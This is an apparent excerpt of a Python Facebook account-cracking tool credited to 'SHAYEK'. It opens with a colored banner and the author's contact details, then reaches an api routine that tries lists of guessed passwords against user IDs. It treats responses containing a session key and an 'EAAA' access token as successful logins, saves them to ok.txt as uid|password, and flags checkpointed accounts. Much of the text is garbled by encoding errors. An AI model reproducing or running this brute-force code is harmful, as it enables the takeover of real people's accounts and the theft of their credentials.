...
class Main:
	def __init__(self):
		...
		print ("""    
\033[1;91m               _____ _    _  _______     ________ _  __
  / ____| |  | |/ ____\ \   / /  ____| |/ /
 | (___ | |__| | (___  \ \_/ /| |__  | ' / 
  \___ \|  __  |\___ \  \   / |  __| |  <  
  ____) | |  | |____) |  | |  | |____| . \ 
...
\033[1;93m  
    ...
    éˆ¹ï¿½ [é‰æ® AUTHOR   : SHAYEK            éˆ¹ï¿½
    éˆ¹ï¿½ [é‰æ® GITHUB   : SHAYEK-RS      éˆ¹ï¿½
    éˆ¹ï¿½ [é‰æ® WHATSAPP : 01865165707        éˆ¹ï¿½
    éˆ¹ï¿½ [é‰æ® POWER BY : \x1b[1;32mSHAYEK\x1b[1;97m            éˆ¹ï¿½
    éˆ¹æ–ºæ”¢éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹æ¦Ž033[1;92m""")
		...
		print("\033[92;1m        AUTHOR : SHAYEK-RS      ")
		print("\033[97;1m   éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬éˆ¹â‚¬")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://www.facebook.com/profile.php?id=100000479218496')
		else:
			Main()
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:fahim ", " SAHYEK): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[SHAYEKé¦ƒã†éˆ¥å¶æªªé””å»¬ : \033[0;97m %s/%s -> \033[0;92m [OKé¦ƒæ§:%s ]- \033[0;93m[CPé¦ƒæ¨‹:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SHAYEK-OKé¦ƒæ§] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" OK] %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[SHAYEK-CPé¦ƒæ¨‹] %s|%s\033[0;97m         "%(uid, pw))
